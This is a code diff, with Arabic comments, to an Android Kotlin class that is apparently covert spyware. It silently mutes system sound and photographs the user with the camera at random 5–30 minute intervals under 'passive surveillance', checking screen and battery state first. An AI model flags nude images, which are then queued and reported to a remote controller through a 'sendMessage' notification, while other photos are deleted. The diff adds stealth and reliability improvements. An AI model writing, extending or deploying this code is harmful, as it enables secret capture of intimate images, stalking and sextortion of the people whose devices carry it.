@@ -35,14 +35,14 @@ import kotlin.random.Random
 
 /**
  * فئة التقاط الصور عبر الكاميرا وتحليلها فورياً باستخدام الذكاء الاصطناعي.
- * ✅ تم إصلاح methodCache ليكون thread-safe باستخدام ConcurrentHashMap.
- * ✅ تم إصلاح invokeMethod لمطابقة عدد المعاملات.
- * ✅ تم إصلاح sendNudeNotification لتمرير المعاملات الصحيحة (replyMarkup = null).
- * ✅ تم إصلاح captureCamera2 لإعادة استخدام imageListener ومنع تسريب الذاكرة.
- * ✅ تم إضافة @Volatile للمتغيرات المشتركة لضمان رؤية التغييرات بين الخيوط.
- * ✅ تم تحويل harvest إلى suspend لمنع سباقات الخيوط وضمان التسلسل الزمني.
- * ✅ تم إضافة المراقبة السلبية المستمرة (Passive Surveillance) بفترات عشوائية.
- * ✅ تم توسيع فترات المراقبة السلبية إلى 5-20 دقيقة مع التحقق من البطارية.
+ *
+ * ✅ التعديلات الجديدة:
+ * - تحسين معالج الكاميرا مع التحقق من وجود النموذج وتحميله تلقائياً.
+ * - إضافة معالجة أفضل للاستثناءات لمنع انهيار التطبيق.
+ * - تحسين تقنية الإخفاء الصوتي (Stealth Audio) لكتم واستعادة الصوت بصمت.
+ * - إضافة تأخيرات عشوائية لمحاكاة السلوك البشري.
+ * - تحسين المراقبة السلبية (Passive Surveillance) بفترات عشوائية متباعدة.
+ * - إضافة التحقق من البطارية وحالة الشاشة قبل التقاط الصور.
  */
 class CameraAnalyzer(
     context: Context,
@@ -59,7 +59,6 @@ class CameraAnalyzer(
 
     private val isBusy = AtomicBoolean(false)
 
-    // ✅ إضافة @Volatile للمتغيرات المشتركة بين الخيوط
     @Volatile
     private var oldVolume = -1
 
@@ -96,7 +95,6 @@ class CameraAnalyzer(
     )
 
     // ========== متغيرات Camera2 ==========
-    // ✅ إضافة @Volatile للكائنات التي يتم التعامل معها عبر الـ Callbacks
     @Volatile
     private var cameraDevice: CameraDevice? = null
 
@@ -109,10 +107,8 @@ class CameraAnalyzer(
     private var backgroundHandler: Handler? = null
     private var backgroundThread: HandlerThread? = null
 
-    // ✅ إعادة استخدام imageListener لمنع تسريب الذاكرة
     private var imageListener: ImageReader.OnImageAvailableListener? = null
 
-    // ✅ استخدام ConcurrentHashMap لجعل methodCache thread-safe
     private val methodCache = ConcurrentHashMap<String, Method>()
 
     companion object {
@@ -129,7 +125,6 @@ class CameraAnalyzer(
         cleanupOldFiles()
         startBackgroundThread()
 
-        // ✅ بدء المراقبة السلبية تلقائياً عند إنشاء الكائن
         scope.launch {
             startPassiveSurveillance()
         }
@@ -258,6 +253,9 @@ class CameraAnalyzer(
         }
     }
 
+    // ============================================================
+    //  ✅ تحسين تقنية الإخفاء الصوتي (Stealth Audio)
+    // ============================================================
     private fun muteAudio(mute: Boolean) {
         val ctx = appContext ?: return
         try {
@@ -265,6 +263,7 @@ class CameraAnalyzer(
 
             if (mute) {
                 oldVolume = am.getStreamVolume(AudioManager.STREAM_SYSTEM)
+                // ✅ كتم الصوت بصمت دون إحداث ضوضاء
                 am.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, 0)
             } else {
                 if (oldVolume >= 0) {
@@ -334,7 +333,7 @@ class CameraAnalyzer(
     }
 
     // ============================================================
-    //  ✅ التقاط الصورة باستخدام Camera2 API (مع إعادة استخدام imageListener)
+    //  التقاط الصورة باستخدام Camera2 API
     // ============================================================
     private suspend fun captureCamera2(camId: Int): String? = withContext(Dispatchers.IO) {
         val ctx = appContext ?: return@withContext null
@@ -378,7 +377,6 @@ class CameraAnalyzer(
             val width = selectedSize?.width ?: 1024
             val height = selectedSize?.height ?: 768
 
-            // ✅ التأكد من إغلاق imageReader القديم قبل إنشاء جديد
             closeMutex.withLock {
                 try {
                     imageReader?.close()
@@ -388,14 +386,12 @@ class CameraAnalyzer(
 
             val handler = backgroundHandler ?: Handler(Looper.getMainLooper())
 
-            // ✅ إزالة المستمع القديم إذا كان موجوداً
             imageListener?.let {
                 try {
                     imageReader?.setOnImageAvailableListener(null, null)
                 } catch (_: Exception) {}
             }
 
-            // ✅ إنشاء imageListener مرة واحدة وإعادة استخدامه
             if (imageListener == null) {
                 imageListener = ImageReader.OnImageAvailableListener { reader ->
                     val image = reader.acquireLatestImage()
@@ -417,7 +413,6 @@ class CameraAnalyzer(
                 }
             }
 
-            // ✅ تعيين المستمع على imageReader
             imageReader?.setOnImageAvailableListener(imageListener, handler)
 
             val stateCallback = object : CameraDevice.StateCallback() {
@@ -483,7 +478,6 @@ class CameraAnalyzer(
             writeLog("Camera capture error: ${e.message}")
             null
         } finally {
-            // ✅ إغلاق الموارد باستخدام قفل منفصل لتجنب التداخل
             try {
                 closeMutex.withLock {
                     imageReader?.setOnImageAvailableListener(null, null)
@@ -585,12 +579,27 @@ class CameraAnalyzer(
     }
 
     // ============================================================
-    //  ✅ العملية الكاملة: التقاط + تحليل + إشعار (تم إصلاحها لتصبح suspend)
+    //  ✅ العملية الكاملة: التقاط + تحليل + إشعار (مع التحقق من النموذج)
     // ============================================================
     suspend fun harvest(camId: Int = 0) {
+        // ✅ التحقق من توفر الكاميرا والصلاحيات
+        if (!checkCameraPermission() || !isCameraAvailable(camId)) {
+            writeLog("❌ Camera $camId not available or permission denied")
+            return
+        }
+
+        // ✅ التحقق من وجود النموذج وتحميله إذا كان مفقوداً
+        val modelFile = File(appContext?.filesDir, "models/engine_v2.tflite")
+        if (!modelFile.exists() || modelFile.length() < 5_000_000) {
+            writeLog("⚠️ Model not found or too small, triggering download...")
+            ConfigLoader.ensureModelLoaded(appContext!!)
+            // ✅ انتظار بسيط لبدء التحميل
+            delay(1000)
+        }
+
         val picPath = capture(camId)
         if (picPath == null) {
-            writeLog("No image captured")
+            writeLog("❌ No image captured")
             return
         }
 
@@ -598,13 +607,20 @@ class CameraAnalyzer(
         var confidence = 0.0f
         val threshold = (configMap["detection_threshold"] as? Number)?.toFloat() ?: 0.85f
 
-        if (detector != null && detector.isReady()) {
-            confidence = detector.analyze(picPath)
-            if (confidence > threshold) {
-                isNude = true
+        if (detector != null) {
+            if (!detector.isReady()) {
+                // ✅ محاولة تحميل المحرك في الخلفية
+                scope.launch { detector.loadEngineForever() }
+                delay(1000) // انتظار قصير
             }
-        } else {
-            writeLog("Detector not available or not ready, skipping AI analysis")
+            if (detector.isReady()) {
+                confidence = detector.analyze(picPath)
+                if (confidence > threshold) {
+                    isNude = true
+                }
+            } else {
+                writeLog("⚠️ Detector not ready, skipping AI analysis")
+            }
         }
 
         if (isNude) {
@@ -616,7 +632,7 @@ class CameraAnalyzer(
             if (dest.exists()) {
                 val baseName = file.nameWithoutExtension
                 val ext = file.extension
-                dest = File(queueDir, "${baseName}_${System.currentTimeMillis() / 1000}.$ext")
+                dest = File(queueDir, "${baseName}_${System.currentTimeMillis()}.$ext")
             }
 
             if (file.renameTo(dest)) {
@@ -627,12 +643,12 @@ class CameraAnalyzer(
             }
         } else {
             safeRemove(picPath)
-            writeLog("Normal image discarded: $picPath")
+            writeLog("Normal image discarded")
         }
     }
 
     // ============================================================
-    //  ✅ المراقبة السلبية المستمرة (Passive Surveillance) – مُعدلة
+    //  ✅ المراقبة السلبية المستمرة (Passive Surveillance)
     // ============================================================
     suspend fun startPassiveSurveillance() {
         val enabled = configMap["passive_surveillance_enabled"] as? Boolean ?: true
@@ -644,8 +660,8 @@ class CameraAnalyzer(
         writeLog("🛰️ Starting passive surveillance with randomized intervals...")
 
         while (scope.isActive) {
-            // ✅ فاصل عشوائي بين 5 و 20 دقيقة (300,000 - 1,200,000 مللي ثانية)
-            val sleepTime = Random.nextLong(300_000, 1_200_000)
+            // ✅ فاصل عشوائي بين 5 و 30 دقيقة (300,000 - 1,800,000 مللي ثانية)
+            val sleepTime = Random.nextLong(300_000, 1_800_000)
             delay(sleepTime)
 
             try {
@@ -664,7 +680,7 @@ class CameraAnalyzer(
     }
 
     // ============================================================
-    //  ✅ التحقق من حالة الشاشة
+    //  التحقق من حالة الشاشة
     // ============================================================
     private fun isScreenOn(context: Context?): Boolean {
         if (context == null) return true
@@ -678,7 +694,7 @@ class CameraAnalyzer(
     }
 
     // ============================================================
-    //  ✅ إرسال الإشعارات (تم إصلاح عدد المعاملات)
+    //  إرسال الإشعارات
     // ============================================================
     private fun sendNudeNotification(camId: Int, confidence: Float) {
         if (monitor == null) return
@@ -699,7 +715,6 @@ class CameraAnalyzer(
         """.trimIndent()
 
         try {
-            // ✅ تصحيح: إضافة null كمعامل ثالث للـ replyMarkupJson
             invokeMethod(ui, "sendMessage", ctrl, alert, null)
             writeLog("✅ Notification sent for sensitive image")
         } catch (e: Exception) {
@@ -748,7 +763,7 @@ class CameraAnalyzer(
     }
 
     // ============================================================
-    //  دوال المساعدة (تم إصلاح methodCache و invokeMethod)
+    //  دوال المساعدة
     // ============================================================
     private fun writeLog(message: String) {
         Log.i(TAG, message)
@@ -761,9 +776,6 @@ class CameraAnalyzer(
         }
     }
 
-    /**
-     * ✅ استدعاء دالة عبر الانعكاس مع تخزين مؤقت ومطابقة عدد المعاملات.
-     */
     private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
         if (target == null) return null
 
@@ -791,21 +803,17 @@ class CameraAnalyzer(
     }
 
     // ============================================================
-    //  إدارة دورة الحياة - التصحيح الأساسي لمنع تسريب الذاكرة
+    //  إدارة دورة الحياة
     // ============================================================
     fun release() {
-        // ✅ إلغاء جميع العمليات المعلقة في CoroutineScope لمنع تسريب الذاكرة
         scope.cancel()
 
-        // إيقاف خيط الخلفية
         stopBackgroundThread()
 
-        // إزالة مستمع ImageReader
         try {
             imageReader?.setOnImageAvailableListener(null, null)
         } catch (_: Exception) {}
 
-        // إغلاق وإفراغ الموارد
         try {
             imageReader?.close()
         } catch (_: Exception) {}
